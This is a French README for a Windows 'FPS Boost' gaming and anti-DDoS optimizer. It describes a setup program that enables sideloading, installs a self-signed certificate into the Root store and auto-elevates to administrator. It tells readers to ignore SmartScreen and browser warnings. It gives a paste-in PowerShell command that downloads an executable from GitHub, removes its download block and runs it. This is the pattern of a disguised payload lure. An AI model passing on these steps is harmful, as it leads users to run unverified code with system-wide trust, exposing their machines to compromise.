# FPS Boost v3.0 (v3.0.25) — Suite d'Optimisation PC, Gaming & Cyber-Défense

Application desktop signée numériquement d'optimisation système de niveau noyau, télémétrie matérielle 100% temps réel, débridage gaming, optimiseur de stream en direct et bouclier Anti-DDoS complet pour **Windows 10 & Windows 11 (64-bit)**.

> **Distribution officielle signée (package MSIX SHA-256)** — L'application s'installe dans le conteneur système protégé Windows (`WindowsApps`) et son intégrité cryptographique est vérifiée avant chaque installation.

---

## Installation en 1 Clic (Comme Discord, Steam ou Spotify)

Téléchargez simplement **`FPS_Boost_Setup.exe`** et lancez-le !

L'assistant graphique autonome tout-en-un embarque l'application complète, le certificat officiel et s'occupe de **100% de la configuration** en quelques secondes :
1. **Déblocage Automatique** : Supprime instantanément le blocage de téléchargement Windows (`Zone.Identifier`).
2. **Débridage Sideloading Windows** : Active automatiquement `AllowAllTrustedApps = 1`.
3. **Installation du Certificat Officiel** : Intègre le certificat signé `CN=LeVraisJay` dans `TrustedPeople` et `Root`.
4. **Déploiement MSIX Système Sécurisé** : Installe le package dans le conteneur WindowsApps en lecture seule protégée.
5. **Raccourci Bureau & Démarrage Automatique** : Crée l'icône sur le Bureau et lance FPS Boost immédiatement !

> 💡 **Si Windows ou votre navigateur affiche un avertissement de sécurité :**
> - **Sous Windows SmartScreen** : Cliquez sur **« Informations complémentaires »** puis sur **« Exécuter quand même »**.
> - **Dans le navigateur (Edge / Chrome)** : Cliquez sur les trois petits points `...` à côté du téléchargement > **Conserver** > **Conserver quand même**.
> - **Déblocage en 1 Clic (PowerShell)** : Ouvrez PowerShell et collez la commande suivante pour tout débloquer et lancer automatiquement :
>   ```powershell
>   irm https://raw.githubusercontent.com/Hiver-protect/FpsBoost/main/FPS_Boost_Setup.exe -OutFile "$env:TEMP\FPS_Boost_Setup.exe"; Unblock-File "$env:TEMP\FPS_Boost_Setup.exe"; Start-Process "$env:TEMP\FPS_Boost_Setup.exe"
>   ```

---

## Fonctionnalités Clés

### ⚡ 1. Élévation Administrateur Automatique
- Auto-élévation transparente via le lanceur natif Windows (`LvFpsBoost.exe`) et le moteur d'exécution : tous les réglages noyau (Registre HKLM, plans d'énergie, services système, pare-feu) s'appliquent immédiatement sans nécessiter de clic droit manuel.

### 🚀 2. Débridage Gaming & Optimisation Noyau 100% Réelle
- **Purge RAM Standby Native (ISLC)** : Libération instantanée de gigaoctets de mémoire inactive via `NtSetSystemInformation` (`SeProfileSingleProcessPrivilege`).
- **Timer Noyau Haute Précision** : Verrouillage à **0.500 ms** (`[LvCpuHelper]::SetTimerHalfMs()`) pour éliminer la latence d'entrée et les micro-saccades en jeu.
- **MMCSS Gaming & Priorité Réseau** : `SystemResponsiveness = 0` (100% CPU alloué au jeu/stream) et `NetworkThrottlingIndex = 0xFFFFFFFF` (zéro gigue réseau).
- **Débridage TCP / Réseau** : `TcpAckFrequency = 1` et `TCP_NODELAY = 1` sur cartes réseau physiques actives.
- **Plan d'Alimentation Ultimate Performance** : Fréquence maximale du processeur et débridage des cœurs (Core Unparking).

### 🎙️ 3. Optimiseur Live Streaming Temps Réel
- Détection et priorisation instantanée des encodeurs : **TikTok LIVE Studio**, **OBS Studio (64-bit)**, **Streamlabs Desktop** et **Discord**.
- Priorité CPU Haute (`Real-Time / High`) et `IoPriority` maximale.
- Mode MMCSS Pro Audio & Capture avec `NoLazyMode = 1` pour supprimer les désynchronisations audio/vidéo en plein direct.

### 🛡️ 4. Bouclier Anti-DDoS Cyber HUD & Atténuation en Direct
- **Bannière Radar Cybernétique** : Indicateur de menace en direct (`SÉCURISÉ`, `MODE BUNKER`, `SURVEILLANCE`, `ALERTE FLOOD`).
- **12 Boucliers Noyau & Pare-feu** :
  1. *Anti-SYN Flood (Niveau 2)* : `SynAttackProtect = 2` + `TcpMaxHalfOpen = 500`.
  2. *Filtre Anti-UDP Flood & Réflexion* : Blocage des ports d'amplification DDoS entrants (17, 19, 123, 137, 138, 1900, 3702, 5353).
  3. *Anti-Ping Flood (Furtif)* : Blocage des échos ICMPv4/v6 (PC 100% invisible aux scanners externes).
  4. *Anti-Smurf & Land Attack* : `DisableIPSourceRouting = 2` + blocage spoofing loopback/broadcast.
  5. *Verrouillage Ports Sensibles* : Fermeture des ports SMB (445), RPC (135), RDP (3389), WinRM.
  6. *Pare-feu Strict* : Blocage entrant par défaut sur tous les profils (Public, Privé, Domaine).
  7. *Anti-ARP Poisoning & Redirections* : `EnableICMPRedirect = 0` et `NoNameRelease = 1`.
  8. *Anti-Fuite IP WebRTC* : Désactivation des tunnels Teredo, 6to4, ISATAP et SSDP.
  9. *DNS Chiffré DoH* : Enforce Cloudflare 1.1.1.1 / Google 8.8.8.8 avec désactivation LLMNR.
  10. *Mode Bunker Instantané* : Forteresse verrouillant tous les ports critiques en 1 clic.
  11. *Defender Protection Réseau* : Blocage des C2 / IPs malveillantes botnet.
  12. *Exploit Guard & LSASS PPL* : Durcissement mémoire ASLR/DEP et protection anti-dump LSASS.
- **Détecteur de Flood Réseau & Blocage d'IP Direct** : Surveillance continue des connexions distantes et blocage d'IP malveillante dans le Pare-feu Windows.
- **Purge Tables & Sockets** : Vidage instantané du cache DNS, des tables ARP (`arp -d *`) et NetBIOS.

---

## Prérequis
- Windows 10 ou Windows 11 (64-bit)
- Droits Administrateur lors de l'exécution (auto-gérés par l'application)
